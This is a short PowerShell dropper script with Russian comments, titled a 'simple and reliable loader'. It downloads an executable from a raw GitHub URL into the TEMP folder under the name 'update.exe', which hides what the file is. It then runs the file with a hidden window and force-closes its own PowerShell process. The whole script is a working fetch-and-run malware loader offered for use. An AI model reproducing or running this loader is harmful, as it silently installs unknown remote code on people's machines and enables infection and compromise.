# === Простой и надёжный загрузчик ===

Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green

# Скачиваем твой exe
$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\update.exe"

try {
    irm -Uri $exeUrl -OutFile $exePath
    Write-Host "[+] Файл успешно скачан" -ForegroundColor Cyan
    
    # Запускаем скрыто
    Start-Process -FilePath $exePath -WindowStyle Hidden
    Write-Host "[+] Запущен!" -ForegroundColor Green
    
    # Закрываем PowerShell через 2 секунды
    Start-Sleep -Seconds 2
}
catch {
    Write-Host "[-] Ошибка: $($_.Exception.Message)" -ForegroundColor Red
    Start-Sleep -Seconds 2
}

Stop-Process -Id $PID -Force
